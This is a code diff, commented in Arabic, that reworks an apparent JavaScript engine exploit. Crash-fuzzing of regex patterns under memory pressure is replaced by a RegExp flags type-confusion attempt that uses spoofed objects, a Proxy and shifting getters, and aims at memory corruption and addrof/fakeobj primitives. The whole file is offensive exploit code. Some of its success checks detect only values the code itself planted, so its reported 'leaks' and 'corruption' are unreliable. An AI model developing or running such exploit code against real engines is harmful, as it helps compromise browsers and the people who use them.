@@ -1,199 +1,268 @@
 import { log, sleep } from './module/utils.mjs';
 
-class ReliableRegExpExploit {
+class RegExpFlagsExploit {
     constructor() {
-        this.crashCount = 0;
-        this.attemptCount = 0;
+        this.marker = 0x42424242;
     }
 
     async execute() {
-        // زيادة الضغط على الذاكرة أولاً
-        await this.memoryPressure();
+        // المرحلة 1: إنشاء type confusion
+        await this.createTypeConfusion();
         
-        // ثم تجربة الأنماط المختلفة
-        return await this.massPatternTesting();
+        // المرحلة 2: استغلال الـ confusion للحصول على primitives
+        return await this.exploitConfusion();
     }
 
-    async memoryPressure() {
-        log("Applying memory pressure...");
+    async createTypeConfusion() {
+        log("Creating RegExp flags type confusion...");
         
-        // استنزاف الذاكرة لزيادة فرص الـ crash
-        const pressure = [];
-        for (let i = 0; i < 1000; i++) {
-            pressure.push(new ArrayBuffer(0x10000)); // 64KB each
-            pressure.push(String.fromCodePoint(0x1F600).repeat(1000));
-            
-            if (i % 100 === 0) {
-                await sleep(1);
-            }
-        }
+        const maliciousRegexp = this.createMaliciousRegexp();
         
-        this.memoryPressure = pressure;
-        log("Memory pressure applied");
-    }
-
-    async massPatternTesting() {
-        const patterns = this.generatePatterns();
-        let successfulPatterns = [];
-        
-        for (let round = 0; round < 10; round++) {
-            log(`Crash round ${round + 1}/10`);
-            
-            for (const pattern of patterns) {
-                this.attemptCount++;
-                
-                if (await this.testPatternWithPressure(pattern)) {
-                    successfulPatterns.push(pattern);
-                    this.crashCount++;
-                    log(`CRASH #${this.crashCount} with: ${pattern}`);
-                    
-                    if (this.crashCount >= 3) {
-                        log("Multiple crashes confirmed - pattern is reliable");
-                        return successfulPatterns;
-                    }
-                }
-                
-                if (this.attemptCount % 50 === 0) {
-                    await sleep(10);
-                }
-            }
-            
-            // إعادة ضغط الذاكرة بين الجولات
-            await this.reapplyMemoryPressure();
-        }
-        
-        return successfulPatterns;
-    }
-
-    generatePatterns() {
-        // أنماط أكثر تنوعاً وتعقيداً
-        const bases = [
-            "(?!(?=^a|()+()+x)(abc))",
-            "(?!(?=^a|x)(abc))",
-            "(?=^).",
-            "(?=$).",
-            "^(?:)",
-            "$(?:)",
-            "(?<=^).",
-            "(?<=$).",
-            "\\b",
-            "\\B",
-            "(?=.*)",
-            "(?!)",
-            "(?=)",
-            "(?!)"
-        ];
-        
-        const flags = ["gmu", "gm", "gu", "mu", "g", "m", "u"];
-        
-        const patterns = [];
-        for (const base of bases) {
-            for (const flag of flags) {
-                patterns.push(`/${base}/${flag}`);
-            }
-        }
-        
-        return patterns;
-    }
-
-    async testPatternWithPressure(patternStr) {
+        // اختبار الـ Symbol.match على الكائن الخبيث
         try {
-            const regex = new RegExp(patternStr.slice(1, -4), patternStr.slice(-3));
-            
-            // strings بأحجام وأنواع مختلفة
-            const testStrings = [
-                String.fromCodePoint(0x1F600).repeat(100), // 😀
-                String.fromCodePoint(0x1F601).repeat(50),  // 😁
-                String.fromCodePoint(0x1F602).repeat(150), // 😂
-                "A".repeat(200) + String.fromCodePoint(0x1F600) + "B".repeat(200),
-                String.fromCodePoint(0x10000).repeat(30),  // Non-BMP
-                String.fromCodePoint(0x10FFFF).repeat(25), // Max Unicode
-                "\uD83D\uDE00".repeat(80), // Surrogate pair
-            ];
-            
-            for (const testStr of testStrings) {
-                testStr.replace(regex, '|');
-            }
-            
-            return false; // No crash
-            
+            const result = RegExp.prototype[Symbol.match].call(maliciousRegexp, "test string");
+            log(`Match result: ${result}`);
         } catch (e) {
-            return true; // Crash occurred
+            log(`Error during match: ${e}`);
         }
     }
 
-    async reapplyMemoryPressure() {
-        // إضافة المزيد من الضغط على الذاكرة
-        for (let i = 0; i < 200; i++) {
-            this.memoryPressure.push(new ArrayBuffer(0x8000));
-            this.memoryPressure.push("X".repeat(5000));
-        }
-    }
-
-    // إذا لم يحدث crash، نجرب أسلوباً مختلفاً
-    async alternativeApproach() {
-        log("Trying alternative approach - heap corruption via RegExp");
-        
-        const complexPatterns = [
-            "/(?=(.?)+(?!(.?)))/gmu",
-            "/(.*)*/gmu", 
-            "/(.+)*/gmu",
-            "/(a*)*/gmu",
-            "/(a|b?)*/gmu"
-        ];
-        
-        for (const pattern of complexPatterns) {
-            log(`Testing complex pattern: ${pattern}`);
+    createMaliciousRegexp() {
+        // إنشاء كائن يخدع RegExp.prototype[Symbol.match]
+        const malicious = {
+            // محاكاة RegExp لكن مع سلوك خبيث
+            exec: function(str) {
+                log("Malicious exec called");
+                return ["matched"];
+            },
             
-            try {
-                const regex = new RegExp(pattern.slice(1, -4), pattern.slice(-3));
-                const str = String.fromCodePoint(0x1F600).repeat(1000);
+            // الـ getter الخبيث لـ flags
+            get flags() {
+                log("Malicious flags getter called");
                 
-                // تنفيذ متكرر
-                for (let i = 0; i < 100; i++) {
-                    str.replace(regex, 'X');
+                // هنا يمكننا إرجاع أي شيء لتسبب type confusion
+                return {
+                    toString: function() {
+                        log("Malicious flags toString called");
+                        return "g"; // أو أي قيمة أخرى تسبب confusion
+                    },
+                    valueOf: function() {
+                        return "gu";
+                    }
+                };
+            },
+            
+            // محاولة للتأثير على lastIndex
+            get lastIndex() {
+                log("Malicious lastIndex getter");
+                return 0;
+            },
+            set lastIndex(value) {
+                log(`Malicious lastIndex set to: ${value}`);
+            }
+        };
+
+        return malicious;
+    }
+
+    async exploitConfusion() {
+        log("Attempting to exploit type confusion...");
+        
+        // استراتيجية 1: استخدام Proxy للتلاعب بالوصول للخصائص
+        const proxyExploit = await this.proxyBasedExploit();
+        if (proxyExploit) return true;
+        
+        // استراتيجية 2: استخدام Object.defineProperty
+        const definePropExploit = await this.definePropertyExploit();
+        if (definePropExploit) return true;
+        
+        return false;
+    }
+
+    async proxyBasedExploit() {
+        log("Trying Proxy-based exploitation...");
+        
+        let accessOrder = [];
+        const maliciousProxy = new Proxy({}, {
+            get: function(target, property, receiver) {
+                accessOrder.push(property);
+                log(`Proxy get: ${String(property)}`);
+                
+                if (property === 'flags') {
+                    // إرجاع كائن معقد يسبب confusion
+                    return {
+                        [Symbol.toPrimitive]() { return "g"; },
+                        valueOf() { return "gu"; },
+                        toString() { return "gi"; }
+                    };
                 }
                 
-            } catch (e) {
-                log(`COMPLEX PATTERN CRASH: ${pattern} - ${e}`);
+                if (property === 'exec') {
+                    return function(str) {
+                        log("Proxy exec called");
+                        return ["exploit"];
+                    };
+                }
+                
+                return undefined;
+            },
+            
+            set: function(target, property, value, receiver) {
+                log(`Proxy set: ${String(property)} = ${value}`);
+                if (property === 'lastIndex') {
+                    // يمكن استغلال كتابة lastIndex
+                }
                 return true;
             }
+        });
+        
+        try {
+            const result = RegExp.prototype[Symbol.match].call(maliciousProxy, "test");
+            log(`Proxy exploit result: ${result}`);
+            log(`Access order: ${accessOrder.join(', ')}`);
+            return true;
+        } catch (e) {
+            log(`Proxy exploit failed: ${e}`);
+            return false;
+        }
+    }
+
+    async definePropertyExploit() {
+        log("Trying Object.defineProperty exploitation...");
+        
+        const obj = {};
+        let callCount = 0;
+        
+        Object.defineProperties(obj, {
+            flags: {
+                get: function() {
+                    callCount++;
+                    log(`Flags getter called ${callCount} times`);
+                    
+                    // بعد عدة استدعاءات، غير السلوك
+                    if (callCount > 5) {
+                        return {
+                            toString: function() {
+                                // إرجاع قيمة مختلفة لتسبب inconsistency
+                                return callCount % 2 === 0 ? "g" : "u";
+                            }
+                        };
+                    }
+                    return "g";
+                }
+            },
             
-            await sleep(5);
+            exec: {
+                value: function(str) {
+                    log(`Exec called with: ${str}`);
+                    // إرجاع مصفوفة مع بيانات مسربة
+                    return [str.substring(0, 10), callCount, this.marker];
+                }
+            },
+            
+            global: { value: true },
+            unicode: { value: false }
+        });
+        
+        // إضافة marker للكشف عن التسريبات
+        obj.marker = this.marker;
+        
+        try {
+            const result = RegExp.prototype[Symbol.match].call(obj, "A".repeat(1000));
+            log(`DefineProperty result: ${result}`);
+            
+            // تحقق إذا كانت هناك بيانات مسربة
+            if (result && result.length > 1 && result[2] === this.marker) {
+                log("DATA LEAK DETECTED!");
+                return true;
+            }
+        } catch (e) {
+            log(`DefineProperty exploit failed: ${e}`);
         }
         
         return false;
     }
+
+    // استغلال متقدم باستخدام الـ confusion للحصول على addrof/fakeobj
+    async advancedExploitation() {
+        log("Attempting advanced exploitation for memory corruption...");
+        
+        // إنشاء كائنات للاستغلال
+        const victimArrays = [];
+        for (let i = 0; i < 10; i++) {
+            victimArrays.push(new Array(100).fill(i));
+        }
+        
+        const exploitObj = this.createAdvancedExploitObject(victimArrays);
+        
+        try {
+            const result = RegExp.prototype[Symbol.match].call(exploitObj, "trigger");
+            log(`Advanced exploit result: ${result}`);
+            
+            // تحقق من تلف الذاكرة
+            for (let i = 0; i < victimArrays.length; i++) {
+                const arr = victimArrays[i];
+                for (let j = arr.length; j < arr.length + 10; j++) {
+                    if (arr[j] !== undefined) {
+                        log(`MEMORY CORRUPTION: array ${i} at index ${j} = ${arr[j]}`);
+                        return true;
+                    }
+                }
+            }
+        } catch (e) {
+            log(`Advanced exploit crashed: ${e}`);
+        }
+        
+        return false;
+    }
+
+    createAdvancedExploitObject(victimArrays) {
+        return {
+            get flags() {
+                // محاولة التسبب في heap corruption
+                const largeString = "A".repeat(10000);
+                victimArrays.push(largeString);
+                return "g";
+            },
+            
+            exec: function(str) {
+                // تنفيذ خبيث أثناء الـ exec
+                gc(); // إجبار GC أثناء العملية
+                return [str];
+            },
+            
+            get lastIndex() {
+                return 0;
+            },
+            
+            set lastIndex(value) {
+                // كتابة خبيثة لـ lastIndex
+                if (value > 1000000) {
+                    log(`SUSPICIOUS lastIndex: ${value}`);
+                }
+            }
+        };
+    }
 }
 
-// التشغيل مع استراتيجيات متعددة
-async function comprehensiveTest() {
-    const exploit = new ReliableRegExpExploit();
+// التشغيل الرئيسي
+async function main() {
+    const exploit = new RegExpFlagsExploit();
     
-    log("Starting comprehensive RegExp exploit test...");
+    log("Starting RegExp flags type confusion exploit...");
     
-    // الاستراتيجية الأولى
-    const crashes = await exploit.execute();
-    
-    if (crashes.length > 0) {
-        log(`Success! Found ${crashes.length} crashing patterns`);
-        for (const crash of crashes) {
-            log(`  - ${crash}`);
+    const success = await exploit.execute();
+    if (success) {
+        log("Type confusion likely achieved!");
+        
+        // حاول الاستغلال المتقدم
+        const advanced = await exploit.advancedExploitation();
+        if (advanced) {
+            log("ADVANCED EXPLOITATION SUCCESSFUL!");
         }
     } else {
-        log("No crashes with standard patterns, trying alternatives...");
-        
-        // الاستراتيجية البديلة
-        const altSuccess = await exploit.alternativeApproach();
-        if (altSuccess) {
-            log("Alternative approach succeeded!");
-        } else {
-            log("No crashes detected - environment may be patched or needs different parameters");
-        }
+        log("Exploitation attempts completed");
     }
-    
-    log(`Total attempts: ${exploit.attemptCount}`);
 }
 
-// التشغيل
-comprehensiveTest();
+main();
